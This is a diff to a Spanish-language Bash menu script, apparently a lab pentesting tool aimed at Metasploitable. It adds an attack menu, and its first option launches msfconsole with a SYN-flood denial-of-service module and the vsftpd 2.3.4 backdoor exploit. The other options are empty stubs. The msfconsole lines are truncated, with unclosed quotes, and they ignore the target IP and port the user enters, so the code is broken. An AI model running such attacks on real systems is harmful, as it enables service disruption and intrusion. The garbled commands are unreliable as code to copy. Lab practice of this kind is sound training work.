@@ -84,6 +84,16 @@ function fun_elec_dicc(){
 			return $pathdiccionario 2>/dev/null
 	}
 
+#Menu ataque con metasploitable
+function fun_menu_msfconsole(){
+	
+	echo -e "${CIAN}1.${ND}Ataque a Vsftpd."
+	echo -e "${CIAN}2.${ND}Ataque a maquina Windows."
+	echo -e "${CIAN}3.${ND}Ataque a Distcc."
+	echo -e "${CIAN}4.${ND}Ataque a UneralIRCD."
+	echo -e "${ROJO}5.Volver atras.${ND} "
+	echo -e "${AZUL}========================${ND}"
+}
 #Menu busqueda de ficheros
 function fun_menu_busqueda(){
 	echo -e "${CIAN}1.${ND}Busqueda con FIND."
@@ -731,18 +741,52 @@ do
 			done		
 		;;
 		
-		7) #Ataque con metasploit
+		7) #Ataque con msfconsole
 			echo "7"
 			
-			
-			# Confirmacion para avanzar
-			read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla			
+			i_msfconsole=0
+			while true 
+			do
+				fun_menu_general "Ataque con MSFCONSOLE"
+				fun_menu_msfconsole 
+				read -p $'\e[33mElige una opcion\e[0m: ' i_msfconsole
+				
+				case $i_msfconsole in
+					1)
+						
+						read -p "Especifica la ip objetivo: " ipObjetivo
+
+						read -p "Especifica el puerto: " puertObjetivo
+						
+						msfconsole -q -x "use auxiliary/dos/tcp/synflood;set RHOST $TARGET; exploit;
+						msfconsole -q -x use exploit/unix/ftp/vsftpd_234_backdoor;set payload cmd/un>
+						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
+					;;
+					2)
+						echo "2"
+						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
+					;;
+					3)
+						echo "3"
+						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
+					;;
+					4)
+						echo "4"
+						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
+					;;
+					5)
+						break						
+					;;
+					*)
+						echo "ERROR: OPCION NO CONTEMPLADA"
+						sleep 0.5
+					;;
+				esac
+			done		
 		;;
-		
 		8) #Salir
 			exit
 		;;
-		
 		*)
 			echo "Opcion no valida"
 			sleep 0.5
